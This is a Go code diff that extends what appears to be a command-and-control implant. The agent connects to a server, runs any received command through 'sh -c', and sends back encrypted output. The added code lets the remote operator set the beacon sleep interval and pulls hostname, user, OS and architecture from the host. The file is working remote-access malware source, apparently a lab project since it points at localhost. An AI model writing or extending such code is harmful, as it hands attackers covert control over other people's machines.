@@ -12,14 +12,22 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"runtime"
+	"strconv"
 	"strings"
+	"time"
 )
 
-var publicKey *rsa.PublicKey
+var (
+	publicKey     *rsa.PublicKey
+	sleepInterval time.Duration
+)
 
 func main() {
 	loadPublicKey()
 	serverAddr := "127.0.0.1:5000"
+
+	sleepInterval = 0
 
 	caCert, err := os.ReadFile("certs/server.crt")
 	if err != nil {
@@ -55,6 +63,7 @@ func main() {
 		}
 		b64 := base64.StdEncoding.EncodeToString(encrypted)
 		conn.Write([]byte(b64 + "\n"))
+		time.Sleep(sleepInterval)
 	}
 }
 
@@ -85,9 +94,30 @@ func receiveCommand(r *bufio.Reader) (string, error) {
 }
 
 func executeCommand(cmd string) string {
-	out, err := exec.Command("sh", "-c", cmd).Output()
+	if strings.HasPrefix(cmd, "sleep ") {
+		parts := strings.SplitN(cmd, " ", 2)
+		if len(parts) == 2 {
+			if sec, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
+				sleepInterval = time.Duration(sec) * time.Second
+				return fmt.Sprintf("[+] Sleep set to %ds", sec)
+			}
+		}
+		return "[-] Invalid sleep command"
+	}
+
+	if cmd == "sysinfo" {
+		return getSysInfo()
+	}
+
+	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
 	if err != nil {
-		return "[-] Command execution failed"
+		return fmt.Sprintf("[-] Command execution failed: %v", err)
 	}
 	return string(out)
+}
+
+func getSysInfo() string {
+	host, _ := os.Hostname()
+	user := os.Getenv("USER")
+	return fmt.Sprintf("hostname: %s\nuser: %s\nos: %s\narch: %s", host, user, runtime.GOOS, runtime.GOARCH)
 }
